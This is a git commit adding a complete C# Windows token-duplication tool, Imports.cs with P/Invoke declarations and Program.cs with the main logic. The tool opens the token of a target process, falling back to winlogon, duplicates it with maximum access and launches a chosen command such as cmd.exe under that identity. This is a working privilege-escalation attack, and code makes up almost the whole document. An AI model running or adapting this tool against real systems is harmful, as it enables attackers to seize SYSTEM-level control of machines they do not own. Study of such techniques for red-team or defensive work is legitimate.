6657a38357bdbea866a105087e920f6533032ea9
Silky <40408435+S1lkys@users.noreply.github.com>
2023-07-23 21:35:41 +0200

    Add files via upload

---
+++ Imports.cs
@@ -0,0 +1,146 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Diagnostics;
+using System.Linq;
+using System.Runtime.InteropServices;
+using System.Security.Principal;
+using System.Text;
+using System.Threading.Tasks;
+
+namespace TokenDuplication
+{
+    class Imports
+    {
+        [DllImport("advapi32.dll", SetLastError = true)]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        public static extern bool OpenProcessToken(IntPtr ProcessHandle, UInt32 DesiredAccess, out IntPtr TokenHandle);
+
+        [DllImport("advapi32.dll")]
+        public static extern bool DuplicateToken( IntPtr ExistingTokenHandle, int SECURITY_IMPERSONATION_LEVEL,ref IntPtr DuplicateTokenHandle);
+
+        [DllImport("advapi32.dll", SetLastError = true)]
+        public static extern bool ImpersonateLoggedOnUser(IntPtr hToken);
+
+        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
+        public struct STARTUPINFO
+        {
+            public Int32 cb;
+            public string lpReserved;
+            public string lpDesktop;
+            public string lpTitle;
+            public Int32 dwX;
+            public Int32 dwY;
+            public Int32 dwXSize;
+            public Int32 dwYSize;
+            public Int32 dwXCountChars;
+            public Int32 dwYCountChars;
+            public Int32 dwFillAttribute;
+            public Int32 dwFlags;
+            public Int16 wShowWindow;
+            public Int16 cbReserved2;
+            public IntPtr lpReserved2;
+            public IntPtr hStdInput;
+            public IntPtr hStdOutput;
+            public IntPtr hStdError;
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        public struct PROCESS_INFORMATION
+        {
+            public IntPtr hProcess;
+            public IntPtr hThread;
+            public int dwProcessId;
+            public int dwThreadId;
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        public struct SECURITY_ATTRIBUTES
+        {
+            public int Length;
+            public IntPtr lpSecurityDescriptor;
+            public bool bInheritHandle;
+        }
+
+        public enum TOKEN_TYPE
+        {
+            TokenPrimary = 1,
+            TokenImpersonation
+        }
+
+        [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        public extern static bool DuplicateTokenEx(
+            IntPtr hExistingToken,
+            uint dwDesiredAccess,
+            ref SECURITY_ATTRIBUTES lpTokenAttributes,
+            int SECURITY_IMPERSONATION_LEVEL,
+            TOKEN_TYPE TokenType,
+            out IntPtr phNewToken);
+
+        public enum LogonFlags
+        {
+            WithProfile = 1,
+            NetCredentialsOnly
+        }
+
+        public enum CreationFlags
+        {
+            DefaultErrorMode = 0x04000000,
+            NewConsole = 0x00000010,
+            NewProcessGroup = 0x00000200,
+            SeparateWOWVDM = 0x00000800,
+            Suspended = 0x00000004,
+            UnicodeEnvironment = 0x00000400,
+            ExtendedStartupInfoPresent = 0x00080000
+        }
+
+        [DllImport("advapi32", CharSet = CharSet.Unicode, SetLastError = true)]
+        public static extern bool CreateProcessWithTokenW(
+            IntPtr hToken,
+            LogonFlags dwLogonFlags,
+            string lpApplicationName,
+            string lpCommandLine,
+            CreationFlags dwCreationFlags,
+            IntPtr lpEnvironment,
+            string lpCurrentDirectory,
+            [In] ref STARTUPINFO lpStartupInfo,
+            out PROCESS_INFORMATION lpProcessInformation);
+
+        [DllImport("kernel32.dll")]
+        public static extern uint GetLastError();
+
+        public static bool IsHighIntegrity()
+        {
+            // returns true if the current process is running with adminstrative privs in a high integrity context
+            WindowsIdentity identity = WindowsIdentity.GetCurrent();
+            WindowsPrincipal principal = new WindowsPrincipal(identity);
+            return principal.IsInRole(WindowsBuiltInRole.Administrator);
+        }
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern IntPtr OpenProcess(
+            ProcessAccessFlags processAccess,
+            bool bInheritHandle,
+            uint processId
+        );
+     
+
+        [Flags]
+        public enum ProcessAccessFlags : uint
+        {
+            All = 0x001F0FFF,
+            Terminate = 0x00000001,
+            CreateThread = 0x00000002,
+            VirtualMemoryOperation = 0x00000008,
+            VirtualMemoryRead = 0x00000010,
+            VirtualMemoryWrite = 0x00000020,
+            DuplicateHandle = 0x00000040,
+            CreateProcess = 0x000000080,
+            SetQuota = 0x00000100,
+            SetInformation = 0x00000200,
+            QueryInformation = 0x00000400,
+            QueryLimitedInformation = 0x00001000,
+            Synchronize = 0x00100000
+        }
+
+    }
+}
---
+++ Program.cs
@@ -0,0 +1,117 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Diagnostics;
+using System.Linq;
+using System.Runtime.CompilerServices;
+using System.Runtime.InteropServices;
+using System.Text;
+using System.Threading.Tasks;
+using static TokenDuplication.Imports;
+
+namespace TokenDuplication
+{
+    internal class Program
+    {
+
+        static void Main(string[] args)
+        {
+            try
+            {
+
+                IntPtr hToken = IntPtr.Zero;
+                IntPtr duplicateToken = IntPtr.Zero;
+
+                STARTUPINFO si = new STARTUPINFO();
+                si.dwFlags = 1;
+                si.wShowWindow = 1;
+                PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
+                SECURITY_ATTRIBUTES sa = new SECURITY_ATTRIBUTES();
+
+                  if (!IsHighIntegrity())
+                  {
+                      Console.WriteLine("[!] Not running in high integrity");
+                      return;
+                  }
+
+                IntPtr hProcess = IntPtr.Zero;
+                int processToDuplicateTokenFrom = 0;
+                string cmdline = "";
+                Process proc = null;
+                bool winlogon = false;
+
+                try { 
+                    processToDuplicateTokenFrom = int.Parse(args[0]);
+                    cmdline = args[1];
+                    proc = Process.GetProcessById(processToDuplicateTokenFrom);
+                    hProcess = proc.Handle;
+                }
+                catch(ArgumentException) {
+                    Console.WriteLine("[!] Did not find any process with pid " + processToDuplicateTokenFrom);
+                    Console.WriteLine("[!] Using winlogon process instead ");
+                    Process[] processes = Process.GetProcessesByName("winlogon");
+                    hProcess = processes[0].Handle;
+                    winlogon = true;
+                }
+
+                if (winlogon)
+                {
+                    Console.WriteLine("[+] Got handle for winlogon: " + hProcess);
+                }
+                else
+                {
+                    Console.WriteLine("[+] Got handle for " + processToDuplicateTokenFrom + ": " + hProcess);
+                }
+                hToken = IntPtr.Zero;
+                // TOKEN_DUPLICATE = 0x0002
+                if (!OpenProcessToken(hProcess, 0x0002, out hToken))
+                {
+                    Console.WriteLine("[!] OpenProcessToken with TOKEN_DUPLICATE access failed");
+                    return;
+                }
+
+                Console.WriteLine("[+] Successfully opened the process token with TOKEN_DUPLICATE access. Handle: " + hToken);
+
+                IntPtr hDupToken = IntPtr.Zero;
+
+                STARTUPINFO sui = new STARTUPINFO();
+                sui.dwFlags = 1;
+                sui.wShowWindow = 1;
+
+                // MAXIMUM_ALLOWED = 0x2000000
+
+                if (!DuplicateTokenEx(hToken, 0x2000000, ref sa, 2, TOKEN_TYPE.TokenImpersonation, out duplicateToken))
+                {
+                    Console.WriteLine("[!] Duplicating the token with the MAXIUM_ALLOWED access rights and TokenImpersonation failed.");
+                    return;
+                }
+
+                Console.WriteLine("[+] Duplicating the token with the MAXIUM_ALLOWED access rights and and TokenImpersonation succeeded.\n[+] Handle to the new duplicate token: " + duplicateToken);
+
+                if (!CreateProcessWithTokenW(duplicateToken,
+                    LogonFlags.NetCredentialsOnly,
+                    null,
+                    cmdline,
+                    CreationFlags.DefaultErrorMode,
+                    (IntPtr)0,
+                    null,
+                    ref sui,
+                    out pi))
+                {
+                    var lastError = GetLastError();
+                    Console.WriteLine("[!] CreateProcessWithTokenW error: {0}", lastError);
+                    return;
+                }
+
+                Console.WriteLine("[+] " + cmdline + " successfully executed. Pid: " + pi.dwProcessId.ToString());
+
+
+            }
+            catch (IndexOutOfRangeException ex)
+            {
+                Console.WriteLine("Usage: {0} [PID to duplicate Token from] [Executable]", System.AppDomain.CurrentDomain.FriendlyName);
+                Console.WriteLine("Example: {0} winlogon cmd.exe", System.AppDomain.CurrentDomain.FriendlyName);
+            }
+        }
+    }
+
+}
